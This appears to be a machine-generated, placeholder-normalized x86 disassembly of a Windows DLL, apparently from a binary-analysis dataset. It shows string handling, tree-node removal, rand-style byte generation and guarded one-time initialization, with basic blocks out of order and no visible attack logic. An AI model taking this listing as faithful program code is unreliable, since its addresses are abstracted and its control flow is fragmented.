sub esp 0x10
cmp [ rw-data ] 0x0
push esi
mov esi [ InterlockedExchange@IAT ]
push edi
mov [ ebp - 0xc ] ecx
jne r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x4 ] eax
jne r-xdata
mov ecx 0x59
call sub_100382c0
push eax
push rw-data
call esi
mov esi [ ebp + 0x8 ]
mov edi 0x1
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
mov ecx 0x5a
call sub_100382c0
push eax
push rw-data
call esi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx [ ebp + 0xc ]
mov edi edi
test edi edi
jne r-xdata
cmp [ esi + 0xd ] 0x0
jne r-xdata
push 0xffffffff
xor edi edi
lea eax [ esi + 0x10 ]
push edi
push eax
mov ecx ebx
call sub_100050b0
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
dec edx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov ecx eax
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea edx [ ecx + 0x1 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
sub ecx edx
push ecx
push eax
mov ecx ebx
call sub_10005470
push 0xffffffff
push 0x0
lea eax [ esi + 0x28 ]
mov ecx ebx
push eax
call sub_100050b0
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
call sub_10032640
mov ecx [ ebp - 0x8 ]
cmp [ esi + 0x4 ] edi
ja r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push [ ebp - 0x8 ]
mov ecx ebx
call sub_10005470
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
imul eax [ edx + 0x38 ] 0x343fd
add eax 0x269ec3
mov [ edx + 0x38 ] eax
xor edx edx
shr eax 0x10
div [ esi + 0x4 ]
mov esi [ esi ]
mov esi [ esi ]
test edx edx
je r-xdata
pop ebx
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub_10031a10
push ebp
mov ebp esp
push 0xffffffff
push sub_10052262
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x44 ] ebx
jne r-xdata
mov esi [ rw-data ]
xor edx edx
imul eax [ edi + 0x38 ] 0x343fd
mov [ ebp - 0x38 ] esi
add eax 0x269ec3
mov [ edi + 0x38 ] eax
shr eax 0x10
div [ edi + 0x20 ]
mov eax [ edi + 0x1c ]
mov eax [ eax ]
test edx edx
je r-xdata
mov ecx 0x56
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
push 0xffffffff
add eax 0x10
mov [ ebx + 0x14 ] 0xf
push 0x0
mov [ ebx + 0x10 ] 0x0
mov ecx ebx
push eax
mov [ ebx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov ebx 0x1
mov [ ebp - 0x30 ] ebx
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
nop
mov [ ebp - 0x29 ] 0x0
push 0xffffffff
dec eax
lea ecx [ edi + 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_10006fa0
mov edx eax
mov [ ebp - 0x4 ] ebx
mov ebx 0x3
mov [ ebp - 0x30 ] ebx
cmp [ esi ] 0x0
jne r-xdata
dec edx
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
cmp [ ebp - 0x29 ] 0x0
je r-xdata
and ebx 0xfffffffd
mov [ ebp - 0x30 ] ebx
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov ecx esi
lea esi [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov esi [ ebp - 0x34 ]
mov ebx [ ebp - 0x38 ]
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
cmp [ edx + 0x14 ] 0x10
mov edi [ edx + 0x10 ]
mov [ ebp - 0x40 ] edi
jb r-xdata
mov eax ecx
cmp eax [ ecx + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov ecx ebx
lea edx [ ecx + 0x1 ]
mov esi [ ebp - 0x34 ]
xor ecx ecx
push ecx
push ebx
push ecx
mov ecx esi
call sub_10032a40
jmp r-xdata
cmp edi ecx
mov esi ecx
cmovb esi edi
test esi esi
je r-xdata
mov edx [ edx ]
mov eax ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
mov esi [ ebp - 0x34 ]
sub ecx edx
push ecx
push ebx
push ecx
mov ecx esi
call sub_10032a40
jmp r-xdata
mov ecx [ ebp - 0x3c ]
push 0xffffffff
add ecx 0x4
push 0x0
push ecx
push ecx
mov ecx esi
call sub_10032930
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
cmp edi ecx
jae r-xdata
mov edi [ ebp - 0x38 ]
sub esi 0x4
jb r-xdata
xor eax eax
cmp edi ecx
setne al
or eax 0xffffffff
jmp r-xdata
cmp esi 0xfffffffc
je r-xdata
lea ebx [ ebx ]
mov [ ebp - 0x4 ] 0x0
test bl 0x2
je r-xdata
test eax eax
xor eax eax
mov al [ edx ]
cmp al [ edi ]
jne r-xdata
add edx 0x4
add edi 0x4
sub esi 0x4
jae r-xdata
sete al
mov [ ebp - 0x29 ] 0x1
test al al
sete al
test al al
jne r-xdata
mov edi [ ebp - 0x40 ]
sbb eax eax
or eax 0x1
jmp r-xdata
cmp esi 0xfffffffd
je r-xdata
mov eax [ edx ]
cmp eax [ edi ]
jne r-xdata
test eax eax
jne r-xdata
mov al [ edx + 0x1 ]
cmp al [ edi + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ edx + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ edx + 0x3 ]
cmp al [ edi + 0x3 ]
je r-xdata
sub_10031ca0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052298
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ esp + 0x14 ] edx
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ esp + 0x20 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi ]
mov [ esp + 0x18 ] ecx
mov esi [ edi ]
cmp esi edi
je r-xdata
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x30 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
lea ebx [ ebx ]
lea ecx [ esi + 0x28 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebx + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x18 ]
dec ecx
cmp [ esi + 0xd ] 0x0
mov [ esp + 0x18 ] ecx
jne r-xdata
push 0xffffffff
push 0x0
push ebx
call sub_100018b0
test ecx 0xfffffffe
jbe r-xdata
cmp esi edi
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
imul eax [ edx + 0x38 ] 0x343fd
add eax 0x269ec3
mov [ edx + 0x38 ] eax
xor edx edx
shr eax 0x10
div ecx
mov ecx ebx
mov eax edx
push eax
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x2c ]
push 0x0
push eax
call sub_10006fa0
mov [ esp + 0x1c ] eax
mov [ esp + 0x50 ] 0x0
lea ebx [ esi + 0x28 ]
cmp ebx eax
je r-xdata
shr ecx 0x1
cmp ecx 0x1
jbe r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov [ esp + 0x50 ] 0xffffffff
cmp [ esp + 0x3c ] 0x10
jb r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
push [ esp + 0x24 ]
mov ebx [ esp + 0x24 ]
mov ecx ebx
push 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
call sub_10001ae0
jmp r-xdata
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebx + 0x14 ] 0xf
mov ecx ebx
mov [ ebx + 0x10 ] 0x0
push eax
mov [ ebx ] 0x0
call sub_10005010
push [ ebx ]
call j_sub_1003f3e3#2
mov eax [ esp + 0x20 ]
add esp 0x4
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
sub_10031e60
push ebp
mov ebp esp
push 0xffffffff
push sub_100522e1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
shr esi 0x1
push esi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x2c ] 0x0
call sub_1003c61a
add esp 0x4
xor ecx ecx
mov edi eax
test esi esi
je r-xdata
push esi
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push edi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
push edi
call j_sub_1003f3e3
mov esi [ ebp - 0x30 ]
lea edx [ ebp - 0x28 ]
add esp 0x4
mov ecx esi
call sub_1003b670
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x34 ] 0xff
lea ebx [ ebx ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
imul eax [ ebx + 0x38 ] 0x343fd
xor edx edx
add eax 0x269ec3
mov [ ebx + 0x38 ] eax
shr eax 0x10
div [ ebp - 0x34 ]
mov [ ecx + edi ] dl
inc ecx
cmp ecx esi
jb r-xdata
sub_10031f80
push ebp
mov ebp esp
push 0xffffffff
push sub_1005235d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x94 ] 0x0
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x78 ] eax
jne r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x80 ] eax
jne r-xdata
mov ecx 0x5b
call sub_100382c0
push eax
push rw-data
call esi
mov eax [ rw-data ]
xor ebx ebx
mov [ ebp - 0x8c ] ebx
xor edi edi
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x4 ] 0x1
xor esi esi
mov eax [ ebp - 0x78 ]
cmp [ eax + 0x10 ] esi
jbe r-xdata
mov ecx 0x5c
call sub_100382c0
push eax
push rw-data
call esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov ecx edi
sub ecx ebx
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x1
jne r-xdata
mov ebx [ ebp - 0x80 ]
jbe r-xdata
push esi
lea eax [ ebp - 0x71 ]
mov [ ebp - 0x71 ] 0x1
push eax
lea ecx [ ebp - 0x40 ]
call sub_10005470
mov edx ebx
lea ecx [ ebp - 0x58 ]
call sub_1003b8a0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x40 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov ecx [ ebp - 0x90 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_10004f60
mov [ ebp - 0x94 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
push 0x4
lea eax [ ebp - 0x7c ]
mov [ ebp - 0x7c ] esi
push eax
lea ecx [ ebp - 0x40 ]
call sub_10005470
test esi esi
je r-xdata
mov esi [ ebp - 0x90 ]
lea eax [ ebp - 0x40 ]
push eax
mov ecx esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] 0x0
call sub_10004f60
mov [ ebp - 0x94 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
mov eax [ ebp - 0x78 ]
sub ecx edx
push ecx
push esi
push ebx
mov ecx eax
call sub_10032b40
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov edi ebx
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ebx [ ebp - 0x8c ]
mov edi [ ebp - 0x88 ]
mov edx ebx
lea ecx [ edx + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x90 ]
mov esi ebx
cmp ebx edi
je r-xdata
add edi 0x18
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
dec esi
jne r-xdata
push [ ebp - 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
jmp r-xdata
push edi
push ebx
call sub_10004c10
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x84 ] 0x0
mov al [ edx ]
inc edx
test al al
jne r-xdata
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x84 ] 0x0
lea ebx [ ebx ]
mov eax [ edi + 0x10 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x98 ] eax
lea eax [ ebp - 0x98 ]
push 0x4
push eax
call sub_10005470
mov edx edi
lea ecx [ ebp - 0x70 ]
call sub_1003b8a0
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x40 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
mov edi [ ebp - 0x88 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x7c ]
sub edx ecx
cmp [ eax ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x18
cmp esi edi
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
mov ecx [ ebp - 0x78 ]
lea eax [ edx + edi ]
push eax
push [ ebp - 0x7c ]
call sub_10032b40
mov [ ebp - 0x80 ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea ebx [ ebx ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
mov edx ebx
lea esi [ edx + 0x1 ]
mov edi edi
mov al [ edx ]
inc edx
test al al
jne r-xdata
mov eax [ ebp - 0x80 ]
sub edx esi
sub eax ecx
mov ecx [ ebp - 0x78 ]
sub eax edi
push eax
lea eax [ edx + edi ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_10006fa0
mov [ ebp - 0x4 ] 0x2
mov edi [ ebp - 0x18 ]
test edi edi
je r-xdata
mov esi [ ebp - 0x18 ]
cmp esi 0x1
ja r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x8c ]
call sub_1002d230
mov ecx [ ebp - 0x7c ]
lea edx [ ecx + 0x1 ]
jmp r-xdata
nop
cmp ecx 0x10
lea edi [ ebp - 0x28 ]
cmovae edi edx
dec esi
je r-xdata
cmp ecx 0x10
mov [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x28 ]
cmovae eax edx
mov [ eax ] 0x0
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
lea esi [ edi - 0x1 ]
cmp edi esi
jb r-xdata
cmp ecx 0x10
mov [ ebp - 0x18 ] esi
lea eax [ ebp - 0x28 ]
cmovae eax edx
mov [ eax + esi ] 0x0
jmp r-xdata
push esi
lea eax [ edi + 0x1 ]
push eax
push edi
call sub_1003c640
mov ecx [ ebp - 0x14 ]
add esp 0xc
mov edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
cmp ecx 0x10
cmovae eax edx
cmp [ eax ] 0x20
jne r-xdata
mov esi [ ebp - 0x80 ]
sub ecx edx
add esi ecx
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push r--data
call sub_1003c5ec
sub edi esi
cmp edi 0x1
jbe r-xdata
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
cmp esi [ eax + 0x10 ]
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp ecx 0x10
mov [ ebp - 0x18 ] esi
lea eax [ ebp - 0x28 ]
cmovae eax edx
mov [ eax + esi ] 0x0
mov edi [ ebp - 0x18 ]
test edi edi
je r-xdata
cmp ecx 0x10
lea edi [ ebp - 0x28 ]
mov eax esi
cmovae edi edx
add edi esi
sub eax esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x28 ]
jmp r-xdata
push eax
lea eax [ edi + 0x1 ]
push eax
push edi
call sub_1003c640
mov ecx [ ebp - 0x14 ]
add esp 0xc
mov edx [ ebp - 0x28 ]
cmp ecx 0x10
lea eax [ ebp - 0x28 ]
cmovae eax edx
cmp [ edi + eax - 0x1 ] 0x20
jne r-xdata
sub_100324b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032ca0
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10032520
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
push edi
mov [ ebp - 0x4 ] ebx
call sub_10032e20
mov esi eax
cmp esi [ ebx ]
je r-xdata
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
push eax
push ecx
mov ecx ebx
call sub_10033550
push eax
add eax 0x10
mov ecx ebx
push eax
push esi
lea eax [ ebp + 0x8 ]
push eax
call sub_10033660
mov eax [ ebp + 0x8 ]
pop edi
pop esi
add eax 0x28
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x24 ] 0x10
lea edx [ esi + 0x10 ]
mov ecx [ edx + 0x10 ]
mov [ ebp - 0x8 ] ecx
jb r-xdata
cmp [ edi + 0x14 ] 0x10
mov ebx [ edi + 0x10 ]
jb r-xdata
mov edx [ edx ]
mov [ ebp + 0x8 ] edi
mov eax [ edi ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
js r-xdata
mov ecx [ ebp - 0x8 ]
cmp ebx ecx
jb r-xdata
cmp ebx ecx
mov eax ecx
mov ecx [ ebp + 0x8 ]
cmovb eax ebx
push eax
call sub_10030db0
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
pop edi
lea eax [ esi + 0x28 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx ecx
setne al
test eax eax
sub_100325d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032d60
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10032640
push ebp
mov ebp esp
push 0xffffffff
push sub_100523a3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0xc ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
call sub_1002a8d0
mov ecx [ ebp - 0x10 ]
mov esi [ ecx ]
cmp [ esi + 0xd ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov edi [ ecx + 0x8 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edi [ edx + 0x8 ]
cmp edx ecx
jne r-xdata
mov edi esi
jmp r-xdata
cmp [ edi + 0xd ] 0x0
mov esi [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov eax [ ecx ]
mov [ edx ] eax
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0xd ] 0x0
mov esi [ edx + 0x4 ]
jne r-xdata
mov esi edx
jmp r-xdata
cmp [ esi ] ecx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov eax [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ecx + 0x8 ]
mov [ eax + 0x4 ] edx
mov [ edi + 0x4 ] esi
mov eax [ ebx ]
cmp [ eax + 0x4 ] ecx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax ] ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax ] ecx
jne r-xdata
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov [ eax + 0x8 ] edx
mov [ eax ] edx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov cl [ edx + 0xc ]
mov al [ eax + 0xc ]
mov [ edx + 0xc ] al
mov eax [ ebp - 0x10 ]
mov [ eax + 0xc ] cl
mov ecx eax
cmp [ ecx + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0xd ] 0x0
je r-xdata
mov eax [ edi ]
mov edx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx esi
jmp r-xdata
lea esi [ ecx + 0x10 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov eax [ ebx ]
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov edx edi
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx esi
mov [ eax + 0x8 ] edx
jmp r-xdata
mov eax [ ebx ]
mov edx eax
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov [ eax ] edx
mov [ esi + 0x2c ] 0xf
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi + 0xc ] 0x1
lea esp [ esp ]
mov eax [ ebx ]
mov [ eax + 0x8 ] edx
jmp r-xdata
mov edx eax
mov eax [ edx + 0x8 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
push [ ebp - 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call j_sub_1003f3e3#2
mov eax [ ebx + 0x4 ]
add esp 0x4
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0x10 ]
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec eax
mov [ ebx + 0x4 ] eax
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
cmp [ ecx + 0xd ] 0x0
jne r-xdata
mov [ ecx + 0xc ] 0x1
mov ecx ebx
push esi
mov [ esi + 0xc ] 0x0
call sub_1002a870
